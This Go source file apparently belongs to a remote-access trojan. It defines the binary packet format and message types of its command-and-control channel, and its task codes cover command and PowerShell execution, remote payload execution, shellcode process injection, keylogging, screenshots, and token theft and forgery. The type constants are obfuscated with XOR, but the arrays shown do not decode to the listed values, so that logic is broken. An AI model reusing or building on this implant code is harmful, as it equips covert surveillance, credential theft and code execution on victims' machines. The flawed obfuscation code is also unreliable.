package encode

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
)

// 消息类型常量 - 使用简单XOR加密混淆
var (
	msgReg   = []byte{0x12, 0x17, 0x2E} // MsgRegister
	msgHeart = []byte{0x2E, 0x33, 0x28} // MsgHeartbeat
	msgTask  = []byte{0x30, 0x26, 0x24} // MsgTask
	msgTRes  = []byte{0x31, 0x27, 0x2B} // MsgTaskResult
	msgFUp   = []byte{0x32, 0x22, 0x2C} // MsgFileUpload
	msgFDown = []byte{0x33, 0x23, 0x2D} // MsgFileDown
	msgSys   = []byte{0x34, 0x24, 0x21} // MsgSysInfo
	msgExit  = []byte{0x1E, 0x32, 0x3C} // MsgExit
)

// 解密消息类型
func decMsgType(data []byte) uint16 {
	var val uint16
	for i, b := range data {
		val ^= uint16(b) << (i % 2 * 8)
	}
	return val
}

// GetMsgType 获取消息类型值
func GetMsgType(t []byte) MsgType {
	return MsgType(decMsgType(t))
}

// 任务类型常量 - XOR加密混淆
var (
	taskEC  = []byte{0x12, 0x24, 0x35, 0x28} // TaskExecCmd
	taskEPS = []byte{0x13, 0x25, 0x36, 0x29} // TaskExecPS
	taskFR  = []byte{0x23, 0x34, 0x27, 0x3A} // TaskFileRead
	taskFW  = []byte{0x24, 0x35, 0x20, 0x3B} // TaskFileWrite
	taskFD  = []byte{0x25, 0x36, 0x21, 0x3C} // TaskFileDelete
	taskLD  = []byte{0x26, 0x30, 0x37, 0x2D} // TaskListDir
	taskPL  = []byte{0x36, 0x31, 0x24, 0x38} // TaskProcList
	taskPK  = []byte{0x37, 0x32, 0x25, 0x39} // TaskProcKill
	taskPI  = []byte{0x40, 0x33, 0x41, 0x2A} // TaskPrivInfo
	taskSI  = []byte{0x41, 0x34, 0x42, 0x2B} // TaskSysInfo
	taskPLd = []byte{0x52, 0x40, 0x36, 0x43} // TaskPayload
	taskEx  = []byte{0x0F, 0x23, 0x34, 0x2C} // TaskExit
)

// 解密任务类型
func decTaskType(data []byte) uint16 {
	var val uint16
	for i, b := range data {
		val ^= uint16(b) << (i % 2 * 8)
	}
	return val
}

// GetTaskType 获取任务类型值
func GetTaskType(t []byte) TaskType {
	return TaskType(decTaskType(t))
}

// MsgType 消息类型
type MsgType uint16

const (
	MsgRegister   MsgType = 0x0001 // 注册
	MsgHeartbeat  MsgType = 0x0002 // 心跳
	MsgTask       MsgType = 0x0003 // 下发任务
	MsgTaskResult MsgType = 0x0004 // 任务结果
	MsgFileUpload MsgType = 0x0005 // 文件上传
	MsgFileDown   MsgType = 0x0006 // 文件下载
	MsgSysInfo    MsgType = 0x0007 // 系统信息
	MsgExit       MsgType = 0x000F // 退出
)

// TaskType 任务类型
type TaskType uint16

const (
	TaskExecCmd    TaskType = 0x0101 // 执行命令
	TaskExecPS     TaskType = 0x0102 // PowerShell
	TaskFileRead   TaskType = 0x0201 // 读取文件
	TaskFileWrite  TaskType = 0x0202 // 写入文件
	TaskFileDelete TaskType = 0x0203 // 删除文件
	TaskListDir    TaskType = 0x0204 // 列目录
	TaskProcList   TaskType = 0x0301 // 进程列表
	TaskProcKill   TaskType = 0x0302 // 杀进程
	TaskPrivInfo   TaskType = 0x0401 // 权限信息
	TaskSysInfo    TaskType = 0x0402 // 系统信息
	TaskPayload    TaskType = 0x0501 // 远程载荷执行
	TaskInject     TaskType = 0x0502 // 进程注入（pid+shellcode）
	TaskScreenshot TaskType = 0x0601 // 截屏
	TaskKeylogOn   TaskType = 0x0602 // 启动键盘记录
	TaskKeylogOff  TaskType = 0x0603 // 停止键盘记录并获取结果
	TaskTokenEnum  TaskType = 0x0701 // 枚举 Token
	TaskTokenSteal TaskType = 0x0702 // 窃取 Token
	TaskTokenRev2  TaskType = 0x0703 // 恢复身份
	TaskTokenMake  TaskType = 0x0704 // 伪造 Token
	TaskExit       TaskType = 0x0F01 // 退出
)

// Packet 通信数据包
// 格式: [Magic 2B][Type 2B][TaskID 4B][DataLen 4B][Data NB]
type Packet struct {
	Type   MsgType // 消息类型
	TaskID uint32  // 任务ID
	Data   []byte  // 数据载荷
}

const Magic = 0xF175

// EncodePacket 编码数据包为字节流
func EncodePacket(pkt *Packet) ([]byte, error) {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.BigEndian, uint16(Magic))         // 2 bytes
	binary.Write(buf, binary.BigEndian, pkt.Type)              // 2 bytes
	binary.Write(buf, binary.BigEndian, pkt.TaskID)            // 4 bytes
	binary.Write(buf, binary.BigEndian, uint32(len(pkt.Data))) // 4 bytes
	buf.Write(pkt.Data)                                        // N bytes
	return buf.Bytes(), nil
}

// DecodePacket 从字节流解码数据包
func DecodePacket(data []byte) (*Packet, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("packet too short: %d", len(data))
	}

	reader := bytes.NewReader(data)
	pkt := &Packet{}

	var magic uint16
	if err := binary.Read(reader, binary.BigEndian, &magic); err != nil {
		return nil, err
	}
	if magic != Magic {
		return nil, fmt.Errorf("invalid magic: 0x%04x", magic)
	}

	if err := binary.Read(reader, binary.BigEndian, &pkt.Type); err != nil {
		return nil, err
	}
	if err := binary.Read(reader, binary.BigEndian, &pkt.TaskID); err != nil {
		return nil, err
	}

	var dataLen uint32
	if err := binary.Read(reader, binary.BigEndian, &dataLen); err != nil {
		return nil, err
	}

	// 读取剩余所有数据作为Data (避免长度不匹配问题)
	remaining := reader.Len()
	if int(dataLen) > remaining {
		// 如果声明的长度大于剩余数据，用剩余数据
		pkt.Data = make([]byte, remaining)
	} else {
		pkt.Data = make([]byte, dataLen)
	}
	reader.Read(pkt.Data)

	return pkt, nil
}

// TaskReq 任务请求
type TaskReq struct {
	TaskType TaskType          `json:"task_type"`
	Params   map[string]string `json:"params"`
}

// TaskResp 任务响应
type TaskResp struct {
	TaskID  uint32 `json:"task_id"`
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error,omitempty"`
}

// DecodeTaskReq 从JSON解码任务请求
func DecodeTaskReq(data []byte) (*TaskReq, error) {
	req := &TaskReq{}
	if err := json.Unmarshal(data, req); err != nil {
		return nil, err
	}
	return req, nil
}

// EncodeTaskResp 编码任务响应为JSON
func EncodeTaskResp(resp *TaskResp) ([]byte, error) {
	return json.Marshal(resp)
}
